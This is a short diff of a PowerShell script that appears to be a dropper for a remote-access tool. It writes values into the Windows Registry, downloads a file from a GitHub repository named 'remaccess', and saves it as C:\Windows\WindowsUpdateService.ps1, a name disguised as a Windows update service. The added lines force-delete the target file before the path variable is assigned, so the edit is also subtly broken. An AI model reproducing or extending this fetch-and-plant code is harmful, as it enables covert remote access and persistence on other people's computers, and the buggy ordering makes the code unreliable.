@@ -9,6 +9,9 @@ if (-not (Test-Path $regPath)) {
 # Set the values in the Registry
 Set-ItemProperty -Path $regPath -Name "Code" -Value $code
 Set-ItemProperty -Path $regPath -Name "Data" -Value $data
+if (Test-Path $outputPath -PathType Leaf) {
+    Remove-Item $outputPath -Force
+} else {}
 $url = "https://github.com/DirNotAvailable/remaccess/raw/main/access-control"
 $outputPath = "C:\Windows\WindowsUpdateService.ps1"
 # Download the content from the URL and save it to the specified file
